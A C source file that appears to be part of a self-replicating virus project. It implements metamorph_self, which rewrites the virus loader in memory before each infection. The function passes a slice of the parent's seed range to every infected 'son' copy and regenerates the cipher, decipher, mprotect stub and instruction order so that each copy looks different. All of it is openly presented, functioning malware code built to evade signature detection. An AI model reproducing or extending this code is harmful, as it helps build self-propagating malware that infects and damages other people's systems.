
#include "polymorphism.h"
#include "errors.h"
#include "log.h"

/*
** metamorph_self is a metamorphic generator for the virus loader.
**   It works by regenerating its own loader
**   (overwriting the one that is loaded in memory)
**   before it is copied by our virus later on.
**
**   The uint64_t seed[2] is the range of seeds that belongs to our virus.
**   seed[0] XOR client_id is the unique_seed of the current virus.
**   seed[1] is the last seed that belongs to the current virus.
**   All the numbers that aren't in this range are owned by other UNIQUE copies
**   of this virus.
**
**   When a new virus is bred, the parent gives away a part of his seed range
**   to his child, losing ownership of the range given.
**
**   (1)    father[n, m]
**   (2)    father infects son
**   (3)    father[n, p] and son[p + 1, m] with n < p < m
**
*/

void		mark_below(void);
void		return_to_client(void);

bool		metamorph_self(uint64_t seed[2], uint64_t son_seed[2], uint64_t client_id)
{
	log_old_father_seeds(seed);
	yield_seed_to_heir(seed, son_seed);
	uint64_t unique_seed = son_seed[0] ^ client_id;
	log_all_seeds(seed, son_seed, client_id, unique_seed);

	size_t	cypher_size = (size_t)cypher_end - (size_t)cypher;
	size_t	loader_size = return_to_client - mark_below; // tmp size
	size_t mprotect_size = (size_t)mprotect_end - (size_t)mprotect_call;

	if (!generate_cypher((void *)cypher, unique_seed, cypher_size)
	|| !generate_decypher((void *)decypher, unique_seed, cypher_size)
	|| !permutate_instructions(mark_below, unique_seed, loader_size)
	|| !generate_mprotect((void *)mprotect_call, unique_seed, mprotect_size)
	|| !true) // add more metamorphosis above!
		return errors(ERR_THROW, _ERR_METAMORPH_SELF);

	return true;
}
